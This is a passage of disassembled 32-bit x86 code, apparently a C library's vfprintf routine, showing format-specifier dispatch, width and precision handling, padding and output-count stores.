mov edx, dword [arg_8h]
mov ebx, dword [var_4b4h]
mov eax, dword [edx + 0x94]
sub ebx, esi
mov dword [esp], edx
mov dword [var_8h], ebx
mov dword [var_4h], esi
call dword [eax + 0x1c]
mov dword [var_4b0h], 0xffffffff
cmp eax, ebx
je 0x80642e6
mov edx, dword [arg_8h]
cmp word [edx], 0
jns 0x80642dc
mov ecx, dword [var_4cch]
test ecx, ecx
jne 0x80642c4
mov ecx, dword [var_4b0h]
jmp 0x80641ce
lea eax, [var_40ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x80642b9
mov dword [esp], edx
call fcn.08074580
jmp 0x80642af
mov edx, dword [var_44ch]
mov dword [var_4b0h], eax
cmp byte [edx], 0
je 0x80642a6
mov eax, edx
lea ecx, [var_14h]
mov dword [var_4d8h], 0
inc edx
mov dword [var_4dch], 0
mov dword [var_4e0h], 0
mov dword [var_44ch], edx
mov dword [var_4e4h], 0
mov dword [var_4e8h], 0
mov dword [var_4ech], 0
mov dword [var_4f0h], 0
mov dword [var_4f4h], 0
mov dword [var_4f8h], 0
mov dword [var_4fch], 0
mov dword [var_500h], 0xffffffff
mov dword [var_504h], 0
mov byte [var_505h], 0x20
mov dword [var_4b8h], 0
mov dword [var_4bch], ecx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0be0]
lea esi, [esi]
jmp edx
mov dword [var_4dch], 1
lea esi, [esi]
mov eax, dword [var_44ch]
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov edx, case.0x80643c0.32
movzx eax, byte [eax + 1]
mov byte [var_506h], al
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
jmp 0x80643a8
mov dword [var_4e4h], 1
jmp 0x80643d0
mov dword [var_4e0h], 1
mov byte [var_505h], 0x20
jmp 0x80643d0
mov dword [var_4d8h], 1
jmp 0x80643d0
mov eax, dword [var_4e0h]
test eax, eax
jne 0x80643d0
mov byte [var_505h], 0x30
jmp 0x80643d0
cmp dword [var_4ach], 0xffffffff
mov dword [var_4e8h], 1
jne 0x80643d0
mov ebx, 0
test ebx, ebx
je 0x80644b5
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
test ebx, ebx
mov eax, dword [eax + 0x28]
mov dword [var_4a8h], eax
je 0x80644ae
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_4ach], eax
movzx eax, byte [eax]
test al, al
je 0x806449f
cmp al, 0x7f
je 0x806449f
mov edi, dword [var_4a8h]
cmp byte [edi], 0
jne 0x80643d0
mov dword [var_4ach], 0
jmp 0x80643d0
mov eax, dword [0x80a9ab4]
jmp 0x8064479
mov eax, dword [0x80a9ab4]
jmp 0x806445d
lea esi, [esi]
mov eax, dword [var_44ch]
lea edx, [eax + 1]
mov dword [var_44ch], edx
mov dword [var_448h], edx
movzx eax, byte [eax + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x80675b7
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
mov dword [var_4fch], eax
js 0x8067599
mov ebx, dword [var_4fch]
add ebx, 0x20
cmp ebx, 0x3e7
jle 0x806453e
cmp ebx, 0x1000
ja 0x806755e
mov eax, dword [var_4fch]
mov edx, dword [var_4fch]
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_23h_2]
and eax, 0xfffffff0
lea eax, [edx + eax + 0x20]
mov dword [var_4bch], eax
mov eax, dword [var_44ch]
movzx eax, byte [eax]
mov byte [var_506h], al
mov edx, case.0x80643c0.32
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_506h]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0c60]
jmp edx
mov edx, dword [0x80aad28]
xor edi, edi
test edx, edx
je 0x8064599
mov ecx, dword [var_4c4h]
mov esi, dword [var_51ch]
lea eax, [ecx + ecx*2]
shl eax, 4
mov eax, dword [esi + eax + 8]
mov edi, dword [edx + eax*4]
test edi, edi
mov eax, fcn.08067610
mov edx, dword [var_51ch]
cmove edi, eax
mov eax, dword [var_4c4h]
lea esi, [eax + eax*2]
shl esi, 4
mov ebx, dword [edx + esi + 0x2c]
xor edx, edx
lea eax, [ebx*4 + 0x10]
sub esp, eax
lea ecx, [var_23h]
and ecx, 0xfffffff0
cmp edx, ebx
jae 0x80645f0
mov eax, dword [var_51ch]
mov esi, dword [eax + esi + 0x24]
lea eax, [esi + esi*2]
mov esi, dword [var_524h]
lea eax, [esi + eax*4]
mov dword [ecx + edx*4], eax
add eax, 0xc
inc edx
cmp edx, ebx
jb 0x80645e5
mov dword [var_8h_2], ecx
mov edx, dword [var_4c4h]
lea eax, [edx + edx*2]
shl eax, 4
add eax, dword [var_51ch]
mov dword [var_4h_2], eax
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call edi
test eax, eax
js 0x8064cc0
add dword [var_4b0h], eax
mov esi, dword [var_574h]
test esi, esi
jne 0x806754b
mov eax, dword [var_4c4h]
mov ecx, dword [var_51ch]
mov edi, dword [arg_8h]
lea ebx, [eax + eax*2]
shl ebx, 4
mov edx, dword [edi + 0x94]
mov eax, dword [ecx + ebx + 0x18]
sub eax, dword [ecx + ebx + 0x14]
mov dword [var_8h_2], eax
mov eax, dword [ecx + ebx + 0x14]
mov dword [esp], edi
mov dword [var_4h_2], eax
call dword [edx + 0x1c]
mov esi, dword [var_51ch]
mov edx, eax
mov eax, dword [esi + ebx + 0x18]
sub eax, dword [esi + ebx + 0x14]
cmp edx, eax
jne 0x8064cc0
inc dword [var_4c4h]
add dword [var_4b0h], edx
mov edi, dword [var_514h]
cmp dword [var_4c4h], edi
jae 0x8064cca
mov edi, dword [var_4c4h]
mov eax, dword [var_51ch]
mov dword [var_574h], 0
lea ecx, [edi + edi*2]
shl ecx, 4
movzx ebx, byte [eax + ecx + 0xc]
mov eax, ebx
shr al, 3
mov edx, eax
mov eax, ebx
shr al, 4
and edx, 1
mov esi, eax
mov dword [var_540h], edx
mov eax, ebx
shr al, 5
and esi, 1
mov edi, eax
mov dword [var_544h], esi
mov eax, ebx
shr al, 6
and edi, 1
mov esi, ebx
mov edx, eax
mov dword [var_548h], edi
and esi, 1
mov eax, ebx
and edx, 1
mov dword [var_554h], esi
shr al, 7
mov dword [var_54ch], edx
movzx eax, al
mov dword [var_550h], eax
mov eax, ebx
shr al, 1
mov edi, eax
mov eax, dword [var_51ch]
and edi, 1
mov dword [var_558h], edi
movzx edx, byte [eax + ecx + 0xd]
mov eax, ebx
shr al, 2
mov edi, eax
mov eax, dword [var_51ch]
and edi, 1
shr dl, 1
mov dword [var_560h], edi
mov esi, edx
mov eax, dword [eax + ecx + 4]
shr dl, 2
and esi, 1
mov edi, edx
mov edx, dword [var_51ch]
mov dword [var_55ch], esi
and edi, 1
mov esi, dword [var_51ch]
mov dword [var_564h], eax
mov dword [var_56ch], edi
mov eax, dword [var_51ch]
movzx edx, byte [edx + ecx + 8]
mov esi, dword [esi + ecx]
movzx eax, byte [eax + ecx + 0x10]
mov dword [var_568h], esi
mov byte [var_56eh], dl
mov esi, dword [var_51ch]
mov byte [var_56dh], al
mov eax, dword [esi + ecx + 0x20]
cmp eax, 0xffffffff
je 0x80647d0
mov edi, dword [var_524h]
lea eax, [eax + eax*2]
mov eax, dword [edi + eax*4]
test eax, eax
mov dword [esi + ecx + 4], eax
js 0x806752f
mov eax, dword [var_51ch]
mov ecx, dword [eax + ecx + 4]
mov dword [var_564h], ecx
mov ecx, dword [var_4c4h]
mov esi, dword [var_51ch]
lea edx, [ecx + ecx*2]
shl edx, 4
mov eax, dword [esi + edx + 0x1c]
cmp eax, 0xffffffff
je 0x8064811
mov edi, dword [var_524h]
lea eax, [eax + eax*2]
mov eax, dword [edi + eax*4]
test eax, eax
mov dword [esi + edx], eax
js 0x8067523
mov eax, dword [var_51ch]
mov edx, dword [eax + edx]
mov dword [var_568h], edx
mov edx, dword [var_568h]
cmp dword [var_564h], edx
mov eax, edx
cmovge eax, dword [var_564h]
add eax, 0x20
cmp eax, 0x3e8
jle 0x806488a
cmp dword [var_564h], edx
mov eax, edx
cmovge eax, dword [var_564h]
add eax, 0x20
cmp eax, 0x1000
ja 0x80674c5
mov ecx, dword [var_568h]
cmp dword [var_564h], ecx
mov eax, ecx
cmovge eax, dword [var_564h]
add eax, 0x32
and eax, 0xfffffffc
sub esp, eax
mov eax, ecx
lea edx, [var_23h]
and edx, 0xfffffff0
cmp dword [var_564h], ecx
cmovge eax, dword [var_564h]
lea edx, [eax + edx + 0x20]
mov dword [var_4bch], edx
movzx eax, byte [var_56eh]
mov edx, case.0x80648b6.32
sub eax, 0x20
cmp al, 0x5a
ja case.default.0x80648b6
movsx eax, byte [var_56eh]
mov eax, dword [eax*4 + 0x80a09e0]
mov edx, dword [eax*4 + 0x80a0ee0]
jmp edx
cmp byte [var_506h], 0
je 0x8064cc0
sub esp, 0x610
mov dword [var_514h], 0
mov dword [var_518h], 0x20
lea edi, [var_23h]
mov dword [var_520h], 0
mov dword [var_47ch], 0
and edi, 0xfffffff0
cmp dword [var_4ach], 0xffffffff
mov dword [var_51ch], edi
je 0x8064c57
mov edx, dword [var_4b4h]
mov dword [var_44ch], edx
cmp byte [edx], 0
je 0x8064a4a
mov ecx, dword [var_514h]
lea ecx, [ecx + ecx*2]
shl ecx, 4
mov dword [var_584h], ecx
mov esi, dword [var_518h]
cmp dword [var_514h], esi
jb 0x80649e0
mov ebx, esi
mov edi, dword [var_51ch]
add ebx, ebx
lea eax, [ebx + ebx*2]
mov dword [var_518h], ebx
shl eax, 4
mov dword [var_528h], edi
add eax, 0x10
sub esp, eax
lea eax, [var_23h]
and eax, 0xfffffff0
mov dword [var_51ch], eax
mov eax, edi
add eax, dword [var_584h]
cmp dword [var_51ch], eax
je 0x8064c46
mov ecx, dword [var_584h]
mov edi, dword [var_51ch]
cld
mov esi, dword [var_528h]
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
test byte [var_584h], 2
mov edx, edi
je 0x80649b7
movzx eax, word [esi]
add edx, 2
add esi, 2
mov word [edi], ax
test byte [var_584h], 1
je 0x80649c5
movzx eax, byte [esi]
mov byte [edx], al
mov eax, dword [var_51ch]
add eax, dword [var_584h]
cmp dword [var_528h], eax
je 0x8064c46
lea esi, [esi]
lea eax, [var_444h]
lea edx, [var_47ch]
mov dword [var_10h], eax
mov dword [var_sp_ch], edx
mov eax, dword [var_51ch]
mov ebx, dword [var_584h]
add eax, ebx
mov dword [var_8h_2], eax
mov ecx, dword [var_520h]
mov dword [var_4h_2], ecx
mov eax, dword [var_44ch]
mov dword [esp], eax
call fcn.08074690
mov esi, dword [var_51ch]
add dword [var_584h], 0x30
add dword [var_520h], eax
inc dword [var_514h]
mov eax, dword [esi + ebx + 0x18]
mov dword [var_44ch], eax
cmp byte [eax], 0
jne 0x8064934
mov edi, dword [var_47ch]
mov eax, dword [var_520h]
cld
cmp edi, eax
cmovae eax, edi
mov ecx, eax
mov dword [var_52ch], eax
shl ecx, 2
lea eax, [ecx + 0x10]
shr ecx, 2
sub esp, eax
xor eax, eax
lea edx, [var_23h]
and edx, 0xfffffff0
mov edi, edx
mov dword [var_530h], edx
rep stosd dword es:[edi], eax
mov ecx, dword [var_52ch]
lea eax, [ecx + ecx*2]
lea eax, [eax*4 + 0x10]
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov dword [var_534h], esi
mov dword [var_524h], esi
xor esi, esi
cmp esi, dword [var_514h]
jae 0x8064b3f
mov ebx, dword [var_51ch]
xor edi, edi
add ebx, 0x2c
mov eax, dword [ebx - 0xc]
cmp eax, 0xffffffff
je 0x8064ad5
mov edx, dword [var_530h]
mov dword [edx + eax*4], 0
mov eax, dword [ebx - 0x10]
cmp eax, 0xffffffff
je 0x8064aea
mov ecx, dword [var_530h]
mov dword [ecx + eax*4], 0
mov eax, dword [ebx]
test eax, eax
je 0x8064b30
dec eax
je 0x8064c32
mov eax, dword [0x80aad94]
mov edx, dword [var_530h]
mov ecx, dword [ebx - 0x24]
mov dword [var_580h], eax
mov eax, dword [ebx - 8]
lea eax, [edx + eax*4]
mov dword [var_8h_2], eax
mov eax, dword [ebx]
mov dword [var_4h_2], eax
mov eax, dword [var_51ch]
add eax, edi
mov dword [esp], eax
mov edx, dword [var_580h]
call dword [edx + ecx*4]
nop
inc esi
add edi, 0x30
add ebx, 0x30
cmp esi, dword [var_514h]
jb 0x8064ac0
xor esi, esi
cmp esi, dword [var_52ch]
jae 0x8064b92
mov ebx, dword [var_534h]
nop
mov ecx, dword [var_530h]
mov eax, dword [ecx + esi*4]
cmp eax, 5
je 0x8064b75
jg 0x8064bbd
cmp eax, 2
je 0x8064b75
jg 0x8064bb3
test eax, eax
je 0x8064b75
cmp eax, 1
je 0x8064b75
test ah, 8
je 0x8064ba3
mov eax, dword [var_4c0h]
add dword [var_4c0h], 4
mov eax, dword [eax]
mov dword [ebx], eax
inc esi
add ebx, 0xc
cmp esi, dword [var_52ch]
jb 0x8064b50
mov esi, dword [var_514h]
cmp dword [var_4c4h], esi
jmp 0x8064693
xor eax, eax
xor edx, edx
xor ecx, ecx
mov dword [ebx], eax
mov dword [ebx + 4], edx
mov dword [ebx + 8], ecx
jmp 0x8064b86
cmp eax, 3
je 0x8064b75
cmp eax, 4
jmp 0x8064b6e
cmp eax, 0x100
je 0x8064c18
jg 0x8064be3
cmp eax, 6
je 0x8064bd0
cmp eax, 7
jne 0x8064b70
mov eax, dword [var_4c0h]
add dword [var_4c0h], 8
fld qword [eax]
fstp qword [ebx]
jmp 0x8064b86
cmp eax, 0x200
je 0x8064b75
jg 0x8064c0e
cmp eax, 0x107
jne 0x8064b70
mov eax, dword [var_4c0h]
add dword [var_4c0h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
jmp 0x8064ba9
cmp eax, 0x400
jmp 0x8064b6e
mov eax, dword [var_4c0h]
add dword [var_4c0h], 8
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [ebx + 4], edx
jmp 0x8064b84
mov edx, dword [ebx - 8]
mov eax, dword [ebx - 4]
mov ecx, dword [var_530h]
mov dword [ecx + edx*4], eax
jmp 0x8064b30
mov eax, ebx
shr eax, 1
add ebx, eax
mov dword [var_518h], ebx
jmp 0x80649e0
mov ebx, 0
test ebx, ebx
je 0x8064cb9
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
test ebx, ebx
mov eax, dword [eax + 0x28]
mov dword [var_4a8h], eax
je 0x8064cb2
mov dword [esp], 3
call section.
mov eax, dword [eax + 4]
mov eax, dword [eax + 0x2c]
mov dword [var_4ach], eax
movzx eax, byte [eax]
test al, al
je 0x8064ca3
cmp al, 0x7f
jne 0x806490d
mov dword [var_4ach], 0
jmp 0x806490d
mov eax, dword [0x80a9ab4]
jmp 0x8064c88
mov eax, dword [0x80a9ab4]
jmp 0x8064c6c
mov dword [var_4b0h], 0xffffffff
mov ebx, dword [var_4b8h]
test ebx, ebx
je 0x80642a6
mov eax, dword [var_4b8h]
mov dword [esp], eax
call fcn.08051180
jmp 0x80642a6
mov edi, dword [var_4c4h]
mov edx, dword [var_51ch]
lea eax, [edi + edi*2]
shl eax, 4
add edx, eax
jne 0x8064e39
lea ebx, [var_43ch]
mov eax, edx
mov ecx, 5
cld
mov edi, ebx
mov edx, dword [var_568h]
rep stosd dword es:[edi], eax
movsx eax, byte [var_56eh]
mov ecx, dword [var_564h]
mov dword [var_43ch], edx
mov dword [var_438h], ecx
movzx ecx, byte [var_554h]
mov dword [var_434h], eax
movzx eax, byte [var_558h]
and ecx, 1
and eax, 1
add eax, eax
movzx edx, byte [var_430h]
and edx, 0xfffffffc
or edx, ecx
movzx ecx, byte [var_560h]
or edx, eax
movzx eax, byte [var_540h]
and edx, 0xfffffff3
and ecx, 1
shl ecx, 2
and eax, 1
shl eax, 3
or edx, ecx
movzx ecx, byte [var_544h]
or edx, eax
movzx eax, byte [var_548h]
and edx, 0xffffffcf
and ecx, 1
shl ecx, 4
and eax, 1
shl eax, 5
or edx, ecx
movzx ecx, byte [var_550h]
or edx, eax
movzx eax, byte [var_54ch]
and edx, 0x3f
shl ecx, 7
and eax, 1
shl eax, 6
or edx, eax
movsx eax, byte [var_56dh]
or edx, ecx
mov byte [var_430h], dl
mov dword [var_42ch], eax
mov eax, dword [var_554h]
test eax, eax
je 0x8064e28
mov eax, dword [arg_10h]
add dword [arg_10h], 0xc
mov ecx, dword [eax + 8]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_418h], edx
mov dword [var_414h], ecx
mov dword [var_41ch], eax
lea eax, [var_41ch]
mov dword [var_484h], eax
mov dword [var_4h_2], ebx
lea eax, [var_484h]
mov dword [var_8h_2], eax
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.0806a140
jmp 0x8064612
mov eax, dword [arg_10h]
add dword [arg_10h], 8
fld qword [eax]
fstp qword [ebp - 0x41c]
jmp 0x8064dfe
mov edi, dword [var_51ch]
mov ecx, dword [var_524h]
mov eax, dword [edi + eax + 0x24]
lea eax, [eax + eax*2]
lea eax, [ecx + eax*4]
mov dword [var_484h], eax
mov dword [var_4h_2], edx
jmp 0x8064e0e
mov eax, 0
mov edi, esp
test eax, eax
je 0x8064fac
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x58]
mov dword [var_488h], 0
mov dword [var_48ch], 0
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_48ch]
mov dword [var_8h_2], eax
lea esi, [var_23h]
mov eax, dword [var_4c4h]
and esi, 0xfffffff0
lea edx, [eax + eax*2]
mov eax, dword [var_51ch]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8064f91
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [var_4h_2], eax
mov dword [esp], esi
call fcn.08077b00
cmp eax, 0xffffffff
mov ebx, eax
je 0x8064f80
sub dword [var_564h], eax
mov eax, dword [var_548h]
test eax, eax
jne 0x8064f21
mov eax, dword [var_564h]
test eax, eax
jle 0x8064f21
mov ecx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064f80
add dword [var_4b0h], ebx
mov ebx, dword [var_548h]
test ebx, ebx
je 0x8064f79
mov ecx, dword [var_564h]
test ecx, ecx
jle 0x8064f79
mov ecx, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], ecx
mov esi, dword [arg_8h]
mov dword [esp], esi
call fcn.08075680
add dword [var_4b0h], eax
mov esp, edi
jmp 0x8064620
mov dword [var_4b0h], 0xffffffff
mov esp, edi
jmp 0x8064cca
mov ecx, dword [var_51ch]
mov eax, dword [ecx + edx + 0x24]
mov edx, dword [var_524h]
lea eax, [eax + eax*2]
mov eax, dword [edx + eax*4]
jmp 0x8064ecd
mov eax, dword [0x80a9ab4]
jmp 0x8064e76
lea eax, [var_3fch]
mov dword [var_8h_2], 0x3e8
mov dword [var_4h_2], eax
mov eax, dword [var_4c8h]
mov dword [esp], eax
call fcn.08053300
mov esi, eax
mov dword [var_560h], 0
test esi, esi
mov dword [var_578h], 0
je 0x806536e
mov edx, dword [var_560h]
test edx, edx
jne 0x80651e3
cmp byte [var_56eh], 0x53
je 0x80651e3
cmp dword [var_568h], 0xffffffff
je 0x80651d9
mov eax, 0
test eax, eax
je 0x80651cf
mov dword [esp], 3
call section.
mov eax, dword [eax]
cmp dword [eax + 0x58], 1
je 0x80651b6
mov edx, dword [var_568h]
mov edi, esp
mov dword [var_498h], esi
mov dword [var_494h], 0
mov dword [var_490h], 0
lea eax, [edx*4 + 0x10]
sub esp, eax
lea eax, [var_494h]
mov dword [var_10h], eax
lea edx, [var_23h]
lea eax, [var_498h]
mov ecx, dword [var_568h]
and edx, 0xfffffff0
mov dword [var_4h_2], eax
mov dword [esp], edx
mov dword [var_sp_ch], ecx
mov dword [var_8h_2], ecx
call fcn.08078100
inc eax
je 0x8064f80
mov eax, dword [var_498h]
test eax, eax
jne 0x80651a2
mov dword [esp], esi
call fcn.08053400
mov ebx, eax
mov esp, edi
sub dword [var_564h], ebx
js 0x8065178
mov eax, dword [var_548h]
test eax, eax
jne 0x8065101
mov eax, dword [var_564h]
test eax, eax
jle 0x8065101
mov eax, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], eax
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.08075680
add dword [var_4b0h], eax
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
mov eax, dword [var_548h]
add dword [var_4b0h], ebx
test eax, eax
je 0x806515d
mov eax, dword [var_564h]
test eax, eax
jle 0x806515d
mov edi, dword [var_564h]
mov dword [var_4h_2], 0x20
mov dword [var_8h_2], edi
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [var_578h]
test edi, edi
je 0x8064620
mov dword [esp], esi
call fcn.08051180
jmp 0x8064620
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x94]
mov dword [esp], edi
mov dword [var_4h_2], esi
mov dword [var_8h_2], ebx
call dword [eax + 0x1c]
cmp eax, ebx
jne 0x8064cc0
add dword [var_4b0h], ebx
jmp 0x8064620
mov ebx, eax
mov eax, dword [var_494h]
sub ebx, esi
and eax, 7
sub ebx, eax
jmp 0x80650bc
mov eax, dword [var_568h]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.08076f30
mov ebx, eax
jmp 0x80650be
mov eax, dword [0x80a9ab4]
jmp 0x8065035
mov dword [esp], esi
call fcn.08053400
jmp 0x80651c8
mov eax, dword [var_568h]
mov dword [var_4a4h], esi
mov dword [var_4a0h], 0
lea edi, [var_4a0h]
mov dword [var_49ch], 0
test eax, eax
js 0x8065298
cmp dword [var_568h], 0x1000
ja 0x8065262
mov eax, dword [var_568h]
add eax, 0x12
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov dword [var_sp_ch], edi
lea eax, [var_4a4h]
mov edx, dword [var_568h]
mov dword [var_4h_2], eax
mov dword [esp], esi
mov dword [var_8h_2], edx
call fcn.08077e00
mov ebx, eax
cmp ebx, 0xffffffff
jne 0x80650be
jmp 0x8064cc0
mov esi, dword [var_568h]
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x806521d
mov eax, dword [var_568h]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8064cc0
mov dword [var_578h], 1
jmp 0x8065232
lea ecx, [var_4a4h]
mov dword [var_sp_ch], edi
mov dword [var_8h_2], 0
mov dword [var_4h_2], ecx
mov dword [esp], 0
call fcn.08077e00
cmp eax, 0xffffffff
mov ebx, eax
je 0x8064cc0
mov eax, dword [var_4a0h]
test eax, eax
jne 0x806534a
mov dword [var_4a4h], esi
lea esi, [ebx + 1]
cmp esi, 0x1000
mov dword [var_57ch], esi
ja 0x806531a
lea eax, [ebx + 0x13]
and eax, 0xfffffffc
sub esp, eax
lea esi, [var_23h]
and esi, 0xfffffff0
mov dword [var_sp_ch], edi
lea ecx, [var_4a4h]
mov edx, dword [var_57ch]
mov dword [var_4h_2], ecx
mov dword [esp], esi
mov dword [var_8h_2], edx
call fcn.08077e00
jmp 0x8065254
mov dword [esp], esi
call fcn.0807adb0
test eax, eax
jne 0x80652e6
mov eax, dword [var_57ch]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8064cc0
mov dword [var_578h], 1
jmp 0x80652f5
mov dword [var_sp_ch], str._IO_vfprintf
mov dword [var_8h_2], 0x703
mov dword [var_4h_2], str.vfprintf.c
mov dword [esp], str.__mbstate_____count__0_
call fcn.0805efc0
cmp dword [var_568h], 0xffffffff
je 0x8065380
cmp dword [var_568h], 5
jle 0x806538f
mov esi, 0x80a0a40
mov ebx, 6
jmp 0x80650be
mov esi, 0x80a4f11
xor ebx, ebx
jmp 0x80650be
mov edi, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x806542f
mov eax, dword [var_554h]
test eax, eax
jne 0x8065415
mov eax, dword [var_55ch]
test eax, eax
jne 0x80653fe
mov edi, dword [var_558h]
test edi, edi
je 0x80653e8
mov eax, dword [arg_10h]
mov edx, dword [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov word [eax], dx
jmp 0x8064620
mov eax, dword [arg_10h]
mov ecx, dword [var_4b0h]
add dword [arg_10h], 4
mov eax, dword [eax]
mov dword [eax], ecx
jmp 0x8064620
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
movzx edx, byte [var_4b0h]
mov byte [eax], dl
jmp 0x8064620
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov ecx, dword [eax]
mov eax, dword [var_4b0h]
cdq
mov dword [ecx], eax
mov dword [ecx + 4], edx
jmp 0x8064620
mov esi, dword [var_554h]
test esi, esi
jne 0x80654af
mov ebx, dword [var_55ch]
test ebx, ebx
jne 0x8065494
mov ecx, dword [var_558h]
test ecx, ecx
je 0x8065471
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov edi, dword [var_4b0h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
mov word [eax], di
jmp 0x8064620
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov edi, dword [var_4b0h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
mov dword [eax], edi
jmp 0x8064620
mov ecx, dword [var_51ch]
mov esi, dword [var_524h]
mov eax, dword [ecx + edx + 0x24]
lea eax, [eax + eax*2]
mov eax, dword [esi + eax*4]
jmp 0x8065407
mov esi, dword [var_51ch]
mov edi, dword [var_524h]
mov eax, dword [esi + edx + 0x24]
lea eax, [eax + eax*2]
mov ecx, dword [edi + eax*4]
jmp 0x806541e
mov edi, dword [var_4c4h]
mov eax, dword [var_51ch]
lea edx, [edi + edi*2]
shl edx, 4
add eax, edx
test eax, eax
jne 0x8065a75
mov eax, dword [arg_10h]
add dword [arg_10h], 4
mov eax, dword [eax]
test eax, eax
je 0x8065a52
mov edi, 0x10
xor ebx, ebx
mov dword [var_53ch], eax
mov dword [var_540h], 1
mov dword [var_550h], 0
mov byte [var_56eh], 0x78
cmp dword [var_568h], 0
jl 0x8065a43
mov byte [var_56dh], 0x20
jne 0x80659b2
mov eax, dword [var_53ch]
test eax, eax
jne 0x80659b2
cmp edi, 8
mov esi, dword [var_4bch]
je 0x806599b
mov eax, dword [var_4bch]
sub eax, esi
cmp dword [var_568h], eax
jg 0x8065583
mov eax, dword [var_53ch]
test eax, eax
je 0x8065583
mov eax, dword [var_540h]
test eax, eax
je 0x8065583
cmp edi, 8
je 0x8065992
mov edx, dword [var_4bch]
mov eax, 0
mov ecx, dword [var_548h]
sub edx, esi
sub dword [var_568h], edx
cmovns eax, dword [var_568h]
test ecx, ecx
mov dword [var_568h], eax
jne 0x80657d2
lea eax, [eax + edx]
sub dword [var_564h], eax
mov eax, dword [var_53ch]
test eax, eax
je 0x80655e7
mov ecx, dword [var_540h]
test ecx, ecx
je 0x80655e7
mov eax, dword [var_564h]
sub eax, 2
cmp edi, 0x10
cmovne eax, dword [var_564h]
mov dword [var_564h], eax
test ebx, ebx
jne 0x80655ff
mov edx, dword [var_54ch]
test edx, edx
jne 0x80655ff
mov eax, dword [var_544h]
test eax, eax
je 0x8065605
dec dword [var_564h]
cmp byte [var_56dh], 0x20
je 0x8065796
test ebx, ebx
je 0x8065744
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x14]
cmp eax, dword [edx + 0x18]
jae 0x8065728
mov byte [eax], 0x2d
mov ecx, dword [arg_8h]
inc dword [ecx + 0x14]
inc dword [var_4b0h]
mov eax, dword [var_53ch]
test eax, eax
je 0x8065651
mov eax, dword [var_540h]
test eax, eax
je 0x8065651
cmp edi, 0x10
je 0x80656b6
mov eax, dword [var_568h]
add dword [var_564h], eax
mov edi, dword [var_564h]
test edi, edi
jle 0x806568a
mov edx, dword [var_564h]
mov dword [var_4h_2], 0x30
mov dword [var_8h_2], edx
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.08075680
add dword [var_4b0h], eax
mov edi, dword [arg_8h]
mov ebx, dword [var_4bch]
mov eax, dword [edi + 0x94]
sub ebx, esi
mov dword [esp], edi
mov dword [var_8h_2], ebx
mov dword [var_4h_2], esi
call dword [eax + 0x1c]
cmp eax, ebx
je 0x806461a
jmp 0x8064cc0
mov edi, dword [arg_8h]
mov eax, dword [edi + 0x14]
cmp eax, dword [edi + 0x18]
jae 0x8065710
mov byte [eax], 0x30
mov eax, dword [arg_8h]
inc dword [eax + 0x14]
mov ecx, dword [arg_8h]
inc dword [var_4b0h]
movsx eax, byte [var_56eh]
mov edx, dword [ecx + 0x14]
